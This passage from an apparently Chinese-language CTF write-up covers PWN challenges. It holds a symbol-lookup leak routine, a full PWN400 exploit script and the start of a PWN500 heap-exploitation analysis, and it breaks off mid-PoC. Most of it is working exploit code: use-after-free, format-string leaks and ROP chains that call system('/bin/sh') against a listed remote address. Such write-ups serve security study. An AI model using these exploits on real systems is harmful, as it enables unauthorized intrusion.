            dyn_ent = dyn_section
            dt_sym_tab = 0x0
            dt_str_tab = 0x0
            while True:
                garbage = l64(leak(dyn_ent, 0x8))
                if garbage == 0x6:
                    dt_sym_tab = l64(leak(dyn_ent + 0x8, 0x8))
                elif garbage == 0x5:
                    dt_str_tab = l64(leak(dyn_ent + 0x8, 0x8))
                if dt_str_tab and dt_sym_tab:
                    break
                dyn_ent += 0x10
            print '[+] symtabtttt:t0x%x' % dt_sym_tab
            print '[+] strtabtttt:t0x%x' % dt_str_tab
            return (dt_sym_tab, dt_str_tab)
    def find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base):
        if BITS == 64:
            sym_ent = dt_sym_tab
            while True:
                garbage = l32(leak(sym_ent, 0x4))
                name    = leak(dt_str_tab + garbage, len(func))
                if name == func:
                    break
                sym_ent += 0x18
            adr_func = l64(leak(sym_ent + 0x8, 0x8)) + elf_base
            print '[+] %s loaded addresst:t0x%x' % (func, adr_func)
            return adr_func
    # exploit ELF
    def lookup(func):
        elf_base                = find_elf_base()
        phdr                    = find_phdr(elf_base)
        dyn_section             = find_dyn_section(phdr, elf_base)
        dt_sym_tab, dt_str_tab  = find_sym_str_table(dyn_section)
        func_address            = find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base)
        return func_address
    result = lookup('getshell')
    print '[+] function @ 0x%x' % result
    getshell(result)
    io.itr()
**Reference**
1\. 
**  
**
**PWN400**
**Bugs**
1\. 在delete时没有对对象指针置零
2\. 加密后输入加密结果时存在泄漏，可泄漏出堆地址
**Thinking**
由于在delete后没有对对象指针置零，可导致一个uaf，通过uaf伪造一个对象的虚表指针和虚表，从而执行任意地址代码。另外，由于对象在调用虚函数时会传入一个参数，这个参数是对象本身的地址，因此第一个参数不能直接被我们控制，需要通过一段ROP来设置调用时的参数
大致的利用方式就是先通过UAF调用printf来泄露libc基地址，然后再通过system来getshell
通过一个
**Exploit**
    from zio import *
    target = ('119.28.62.216', 10023)
    io  = zio((target), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 10000)
    io.hint([0x401fba, 0x401fe3, 0x400d40])
    # adr
    plt_printf  = 0x0000000000400be0
    p8_ret      = 0x00402336
    pop_rdi_ret = 0x00402343
    entry       = 0x400d40
    # new key
    def leak():
        io.wls([1, 1, 11, 13])
        # io.wls([2, 0x40, (('AAAAAAAA' +'%{}$lxx00'.format(0x8b)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.wls([2, 0x40, (('AAAAAAAA' +'0x%{}$lxx00'.format(71)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.rtl('ciphertext: ')
        io.r(0x40 * 8)
        heap_base = l64(io.rl()[:-1].ljust(0x8, 'x00')) - 0x270
        print '[+] heap base: 0x%x' % heap_base
        # free
        io.wls([3, 0x10, '41' * 0x10])
        # malloc
        io.wls([4, l64(heap_base + 0x20)])
        # rop chain in stack (uaf)
        io.wls([2, 0x20, (l64(pop_rdi_ret) + l64(heap_base + 0x20) + l64(plt_printf) + l64(entry)).ljust(0x20, 'A')])
        for i in xrange(4): io.rtl('0x')
        adr_libc_start_main_ret = int(io.rtl('R')[:-1], 16)
        off_libc_start_main_ret = 0x21ec5
        libc_base   = adr_libc_start_main_ret - off_libc_start_main_ret
        off_system  = 0x00000000000468f0
        adr_system  = libc_base + off_system
        print '[+] libc base : 0x%x' % libc_base
        print '[+] system : 0x%x' % adr_system
        return adr_system
    def exp(adr_system):
        # io.wls([2, 0x40, (('AAAAAAAA' +'%{}$lxx00'.format(0x8b)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.wls([1, 1, 11, 13])
        io.wls([2, 0x40, (('AAAAAAAA' +'/bin/shx00').ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.rtl('ciphertext: ')
        io.r(0x40 * 8)
        heap_base = l64(io.rl()[:-1].ljust(0x8, 'x00')) - 0x270 + 0x450
        print '[+] heap base: 0x%x' % heap_base
        io.wls([3, 0x10, '41' * 0x10])
        for i in xrange(0x4): io.wls([4, l64(heap_base + 0x20)])
        # rop chain in stack
        io.wls([2, 0x20, (l64(pop_rdi_ret) + l64(heap_base + 0x20) + l64(adr_system) + l64(entry)).ljust(0x20, 'A')])
    exp(leak())
    io.itr()
**  
**
**PWN500**
**Bugs**
1\. 在读取字符串时存在一个null的溢出，在读取package的内容时可溢出到下一个堆块
2\. 一些编程的逻辑漏洞，在save package时没有对package_head置零
**Thinking**
程序开始时会malloc(0x20)用来存储sender，receiver，package链表的头结点地址
malloc(0x98)存储sender的内容
malloc(0xb8)存储receiver的内容
malloc(len+0x18)存储package内容
我采用的利用技巧是shrink free
chunks，这个方法在中有介绍，最终的目标就是构造出overlapping
chunks，这样，通过修改package的内容，来达到修改receiver的链表next和prev指针的目的
之后就可以达到泄露heap和libc的目的，最后覆盖got表来get shell
**PoC of "shrinking free chunks"**
    char *a, *b, *c, *d, *e, *f;
    a = malloc(0x208);
    b = malloc(0x208);